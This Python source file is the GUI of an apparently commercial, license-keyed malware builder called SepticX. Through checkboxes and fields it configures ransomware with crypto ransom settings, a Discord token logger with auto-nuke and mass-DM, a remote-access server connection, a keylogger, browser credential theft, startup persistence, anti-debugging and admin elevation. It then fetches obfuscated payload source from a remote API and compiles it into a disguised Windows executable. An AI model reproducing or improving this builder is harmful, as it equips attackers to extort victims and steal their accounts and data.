
from tqdm import tqdm
from tkinter import *
from PIL import Image
import customtkinter, tkinter
from tkinter import filedialog as fd
from colorama import Style, Fore, Back
from websocket import create_connection
import customtkinter, subprocess, websocket, threading, requests, tkinter, random, base64, json, fade, time, math, sys, ssl, os

customtkinter.set_appearance_mode("dark")

class Frame(customtkinter.CTkFrame):
    def __init__(self, master, widgets, intonly=[], default=[], row=0, column=0, rowspan=0, columnspan=0, padx=20, pady=20, activation_widget=0):
        super().__init__(master)

        self.grid(row=row, column=column, columnspan=columnspan, rowspan=rowspan, padx=20, pady=20, sticky="nsew")

        for i in range(7): # Set 7 rows
            self.rowconfigure(i, weight= 1)
        
        for i in range(6): # Set 6 columns
            self.columnconfigure(i, weight= 1)

        

        for count, (title, data) in enumerate(widgets.items()):
            x = (count // 1) + 1
            y = (count % 1) * 1

            widget_type = data[0]

            if widget_type is customtkinter.CTkEntry:
                var = tkinter.IntVar(value=0)
                widget = widget_type(master=self, placeholder_text=title)
                if count in intonly:
                    vcmd = (self.register(self.enter_only_digits), '%P', '%d')
                    widget.configure(validate='key', validatecommand=vcmd)

                if count not in default:
                    widget.configure(state="disabled")

            elif widget_type is customtkinter.CTkCheckBox:
                widget = widget_type(master=self, text=title, onvalue=True, offvalue=False)

                if activation_widget == count:
                    activate_widget = widget
                    widget.configure(command=lambda: self.on_click(widgets, default, activate_widget.get()))

            else:
                self.icon = tkinter.StringVar(value="")

                widget = widget_type(master=self, text=title, command=lambda: self.file_prompt())
                widget.grid(row=x, column=2, sticky="nsew")

                widgets[title] = self.icon

                continue
                

            widgets[title] = widget
            widget.grid(row=x, column=2, sticky="nsew")

    def enter_only_digits(self, entry, action_type) -> bool:
        if action_type == '1' and not entry.isdigit():
            return False

        return True

    def on_click(self, widgets, default, state):
        for count, widget in enumerate(widgets.values()):
            print(default)
            if count in default:
                continue
            if isinstance(widget, customtkinter.CTkEntry):
                widget.configure(state="disabled" if not state else "normal")

    def file_prompt(self):
        filetypes = (
            ('ICO files', '*.ico'),
        )

        filename = fd.askopenfilename(
            title='Open a file',
            initialdir='/',
            filetypes=filetypes)

        self.icon.set(filename)

class App(customtkinter.CTk):
    def __init__(self):
        os.system('')
        self.hwid = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
        self.banner()

        super().__init__()

        self.geometry("1100x600")

        for i in range(21): # Set 21 rows
            self.rowconfigure(i, weight= 1)
        
        for i in range(18): # Set 18 columns
            self.columnconfigure(i, weight= 1)

        pil_image = Image.open("assets\\Title.png")
        image = customtkinter.CTkImage(dark_image=pil_image, light_image=pil_image, size=(400, 90))

        title = customtkinter.CTkLabel(self, image=image, text="")
        title.grid(row=0, column=0, columnspan=24, sticky="nsew")

        self.get_key()

    def get_key(self):
        key_frame = customtkinter.CTkFrame(self)
        key_frame.grid(row=1, column=0, padx=20, pady=20, sticky="nsew", columnspan=18, rowspan=21)
        
        for i in range(16): # Set 16 rows
            key_frame.rowconfigure(i, weight= 1)
        
        for i in range(16): # Set 16 columns
            key_frame.columnconfigure(i, weight= 1)

        key_entry = customtkinter.CTkEntry(key_frame, placeholder_text='Enter Key')
        key_entry.grid(row=8, column=8, padx=20, pady=20, sticky="nesw")

        response_label = customtkinter.CTkLabel(key_frame, text="")
        response_label.grid(row=9, column=8, columnspan=2, padx=0, pady=20, sticky="nesw")

        submit = customtkinter.CTkButton(key_frame, text='Submit', command=lambda: self.verify_key(key_entry.get(), response_label))
        submit.grid(row=8, column=9, padx=0, pady=20, sticky="nesw")
        submit.grid(row=8, column=9, padx=0, pady=20, sticky="nesw")
    

    def verify_key(self, key, label):
        status_code = requests.get('https://septicx.repl.co/api/verify', data={'key':key, 'hwid': self.hwid}).status_code

        if status_code == 200:
            label.configure(text='Success!')
            time.sleep(1)

            self.key = key

            for child in self.winfo_children()[1:]:
                child.destroy() # Abortion clinic

            self.menu()

        else:
            label.configure(text='Invalid Key')

    def menu(self):
        main_frame = customtkinter.CTkFrame(self)
        main_frame.grid(row=1, column=0, padx=20, pady=20, sticky="nsew", columnspan=18, rowspan=21)

        for i in range(15): # Set 15 rows
            main_frame.rowconfigure(i, weight= 1)
        
        for i in range(15): # Set 15 columns
            main_frame.columnconfigure(i, weight= 1)
    

        ransomware_widgets = {
            "Ransomware": [customtkinter.CTkCheckBox],
            "Reboots Until Run": [customtkinter.CTkEntry],
            "Ransom Time Limit (Hours)": [customtkinter.CTkEntry],
            "Crypto Address": [customtkinter.CTkEntry],
            "Ransom Amount": [customtkinter.CTkEntry],
            "Crypto Currency": [customtkinter.CTkEntry]
        }
        
        ransom_frame = Frame(master=main_frame, widgets=ransomware_widgets, row=0, column=11, columnspan=3, rowspan=10, pady=0, padx=0, intonly=[1, 2, 4])

        discord_widgets = {
            "Token Logger": [customtkinter.CTkCheckBox],
            "Auto Nuke": [customtkinter.CTkCheckBox],
            "MassDM": [customtkinter.CTkCheckBox],
            "MassDM Script": [customtkinter.CTkEntry]
        }
        
        discord_frame = Frame(master=main_frame, widgets=discord_widgets, row=0, column=8, columnspan=3, rowspan=10, pady=0, padx=0)

        connection_widgets = {
            "Connect To Server": [customtkinter.CTkCheckBox],
            "Dynamic Webhook": [customtkinter.CTkCheckBox],
            "Server Address": [customtkinter.CTkEntry],
            "Server Password": [customtkinter.CTkEntry],
            "Webhook": [customtkinter.CTkEntry]
            
        }
        
        connection_frame = Frame(master=main_frame, default=[4], widgets=connection_widgets, row=0, column=5, columnspan=3, rowspan=10, pady=0, padx=0)

        misc_widgets = {
            "Key Logger": [customtkinter.CTkCheckBox],
            "Browser Logs": [customtkinter.CTkCheckBox],
            "Add To Startup": [customtkinter.CTkCheckBox],
            "File Icon": [customtkinter.CTkButton],
            "Anti Debug": [customtkinter.CTkCheckBox],
            "Run As Admin": [customtkinter.CTkCheckBox],
            "Base Obfuscation": [customtkinter.CTkEntry],
            "Obfuscation Level": [customtkinter.CTkEntry]
        }
        
        misc_frame = Frame(master=main_frame, widgets=misc_widgets, intonly=[6, 7], default=[6, 7], row=0, column=1, columnspan=3, rowspan=15, pady=0, padx=0, activation_widget=None)

        

        # Compile Buttom
        button = customtkinter.CTkButton(master=main_frame, text="Compile", command=lambda: threading.Thread(target=self.start_compile, args=(ransomware_widgets, discord_widgets, connection_widgets, misc_widgets)).start())
        button.grid(row=14, column=7, columnspan=2, sticky="ew")

        self.response_label = customtkinter.CTkLabel(master=main_frame, text="", justify='center')
        self.response_label.grid(row=15, column=7, columnspan=2, sticky="ew")

    def start_compile(self, ransomware_config, discord_config, connection_config, misc_config):
        
        server_addr = ''
        server_key = ''
        wallet = ''
        massdm_script = ''
        cost = 0
        crypto_type = ''
        reboots_allowed = 0
        hours = 0
        webhook = ''
        massdm = False
        auto_nuke = False
        massdm_script = ''
        keylogger = False
        dynamic_webhook = False
        
        ransomware = ransomware_config["Ransomware"].get()
        if ransomware:
            reboots_allowed = ransomware_config['Reboots Until Run'].get()
            hours = ransomware_config['Ransom Time Limit (Hours)'].get()
            wallet = ransomware_config['Crypto Address'].get()
            cost = ransomware_config['Ransom Amount'].get()
            crypto_type = ransomware_config['Crypto Currency'].get()

        token_logger = discord_config['Token Logger'].get()
        if discord_config:
            massdm = discord_config['MassDM'].get()
            massdm_script = discord_config['MassDM Script'].get()
            auto_nuke = discord_config['Auto Nuke'].get()
        
        rat_client = connection_config['Connect To Server'].get()
        if rat_client:
            server_addr = base64.b64encode(connection_config['Server Address'].get().replace('https://', '').replace('http://', '').replace('wss://', '').replace('ws://', '').split('/')[0].encode()).decode()
            server_key = base64.b64encode(connection_config['Server Password'].get().encode()).decode()
            dynamic_webhook = connection_config['Dynamic Webhook'].get()
        else:
            webhook = connection_config['Webhook'].get()

        keylogger = misc_config['Key Logger'].get()
        browser = misc_config['Browser Logs'].get()
        startup = misc_config['Add To Startup'].get()
        icon = misc_config['File Icon'].get()
        debug = misc_config['Anti Debug'].get()
        admin = misc_config['Run As Admin'].get()

        self.base = int(misc_config['Base Obfuscation'].get())
        self.recursion = int(misc_config['Obfuscation Level'].get())

        self.response_label.configure(text='Compiling To Exe...')

        self.compile([rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, hours, wallet, cost, crypto_type, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin])

    def banner(self):
        print(fade.greenblue("""
   ▄████████    ▄████████    ▄███████▄     ███      ▄█   ▄████████ ▀████    ▐████▀ 
  ███    ███   ███    ███   ███    ███ ▀█████████▄ ███  ███    ███   ███▌   ████▀  
  ███    █▀    ███    █▀    ███    ███    ▀███▀▀██ ███▌ ███    █▀     ███  ▐███    
  ███         ▄███▄▄▄       ███    ███     ███   ▀ ███▌ ███           ▀███▄███▀    
▀███████████ ▀▀███▀▀▀     ▀█████████▀      ███     ███▌ ███           ████▀██▄     
         ███   ███    █▄    ███            ███     ███  ███    █▄    ▐███  ▀███    
   ▄█    ███   ███    ███   ███            ███     ███  ███    ███  ▄███     ███▄  
 ▄████████▀    ██████████  ▄████▀         ▄████▀   █▀   ████████▀  ████       ███▄ 
        """))

    def compile(self, config):
        rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, hours, wallet, cost, crypto_type, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin = config
        key = {
            "SERVER_CLIENT": rat_client,
            "HOSTNAME": f'O0O000OOO00O0OOO0("{server_addr}").decode()',
            "SERVERKEY": f'O0O000OOO00O0OOO0("{server_key}").decode()',
            "KEYLOGGER": keylogger,
            "RANSOMWARE": ransomware,
            "REBOOTS_ALLOWED": reboots_allowed,
            "HOURS": hours,
            "MONERO_WALLET": wallet,
            "CRYPTO_AMOUNT": cost,
            "CRYPTO_TYPE": crypto_type,
            "WEBHOOK": f'"{webhook}"' if not dynamic_webhook else 'requests.get(f"https://{self.ht}/webhook",data={"key":self.k}).text',
            "TOKEN_LOGGER": token_logger,
            "NUKE_TOKEN": auto_nuke,
            "MASSDM_BOOL": massdm,
            "MASSDM_SCRIPT": massdm_script,
            "BROWSER_LOGGER": browser,
            "ANTI_DEBUG": debug,
            "ADD_TO_STARTUP": startup,
            "ADMIN": admin
        }
        
        src = requests.get('https://septicx.repl.co/api/obfuscate', json={
            "options": {
                "base": self.base,
                "recursion": self.recursion,
                "bytes": True
            },
            "config": key,
            "hwid": self.hwid,
            "key": self.key
            
        }, headers={'content-type':'application/json'}).content

        dir = os.path.dirname(os.path.realpath(__file__))

        with open('src\\output.py', 'wb') as file:
            file.write(src)

        with open('src\\files\\instructions.txt', 'r+') as file:
            data = file.read()

        with open('src\\temp\\instructions.txt', 'w+') as file:
            file.write(data.replace('WALLET', wallet).replace('AMOUNT', str(cost)))


        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--onefile', '--windowed', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{dir}\\src\\files\\annoy.mp3;.', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper_AJ3.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.', '--clean', f'{dir}\\src\\output.py']
        for _ in range(command.count('')):
            command.remove('')
        print(command)

        subprocess.call(command, shell=True)
        self.response_label.configure(text='EXE in dist folder')
        print(self.color('Your file is in the dist folder named "output.exe"'))
        os.system('PAUSE')
        
    def color(self, text, color='blue'):
        key = {
            "blue": Fore.CYAN,
            "red": Fore.RED,
            "green": Fore.GREEN
        }

        return key[color] + text + Style.RESET_ALL

if __name__ == "__main__":
    app = App()
    app.mainloop()